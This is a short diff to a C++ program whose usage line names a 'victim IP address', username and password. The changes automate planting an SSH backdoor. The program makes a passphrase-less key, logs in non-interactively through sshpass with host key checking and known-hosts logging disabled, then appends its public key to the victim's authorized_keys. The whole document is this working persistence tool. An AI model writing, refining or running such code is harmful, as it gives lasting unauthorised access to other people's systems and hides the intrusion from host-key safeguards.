@@ -12,12 +12,12 @@ int main(int argc, char **argv) {
         cout << "Usage: " << argv[0] << " <victim IP address> <username> <password>\n";
         return 0;
     }
-    cmd("ssh-keygen -t rsa");
+    cmd("ssh-keygen -t rsa -N \"\" -f ~/.ssh/id_rsa");
     string ip_addr  = string(argv[1]);
     string username = string(argv[2]);
     string password = string(argv[3]);
-    string ssh_prefix = "ssh " + username + "@" + ip_addr;
+    string ssh_prefix = "sshpass -p \'" + password + "\' ssh -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null " + username + "@" + ip_addr;
 
-    cmd("cat ~/.ssh/id_rsa.pub | " + ssh_prefix + " ' cat >>.ssh/authorized_keys'");
+    cmd("cat ~/.ssh/id_rsa.pub | " + ssh_prefix + " ' cat >> .ssh/authorized_keys'");
     cmd_on_victim(ssh_prefix, "chmod 600  ~/.ssh/authorized_keys");
 }
